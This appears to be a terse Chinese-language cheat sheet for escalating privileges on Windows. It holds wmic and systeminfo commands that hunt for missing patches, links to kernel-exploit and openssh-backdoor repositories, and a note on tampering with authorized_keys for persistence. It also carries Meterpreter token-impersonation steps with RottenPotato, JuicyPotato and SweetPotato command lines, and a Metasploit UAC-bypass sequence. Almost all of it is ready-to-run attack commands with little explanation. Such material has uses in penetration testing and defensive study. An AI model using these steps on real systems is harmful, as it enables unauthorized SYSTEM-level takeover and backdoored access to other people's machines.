#  信息收集

wmic qfe get Caption,Description,HotFixID,InstalledOn
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:“KBxxxxxx”

# 04自动信息收集
Host Information Gathering Script：HIGS.bat
https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat
privilege-escalation-awesome-scripts：winPEAS.bat
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat

# 提权工具脚本

https://blog.csdn.net/weixin_43873557/article/details/113760973


快速查找exp

systeminfo>micropoor.txt&(for %i in (   KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a  micropoor.txt

https://github.com/SecWiki/windows-kernel-exploits
https://github.com/WindowsExploits/Exploits

## ssh 相关
1.密钥篡改 authorized_keys 
2.重装覆盖 openssh-backdoor https://github.com/Psmths/openssh-backdoor
## RottenPotato
https://github.com/foxglovesec/RottenPotato
```bash
msfmeter> use incognito
msfmeter> list_tokens -u
msfmeter> execute -cH -f C:/Users/test/Desktop/rottenpotato.exe
msfmeter> list_tokens -u
msfmeter> impersonate_token "NT AUTHORITY\SYSTEM"
```
## juicypotato
https://blog.csdn.net/negnegil/article/details/120243657
https://github.com/uknowsec/JuicyPotato
JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c {4991d34b-80a1-4291-83b6-3328366b9097}

https://github.com/breenmachine/RottenPotatoNG
https://github.com/antonioCoco/RoguePotato2
https://github.com/CCob/SweetPotato
SweetPotato -a "whoami"
## getSystem
getSystem "whoami"


### bypassuac

```bash
search bypassuac
use exploit/windows/local/bypassuac
options
set session 1
run -j
getuid
getsystem
```
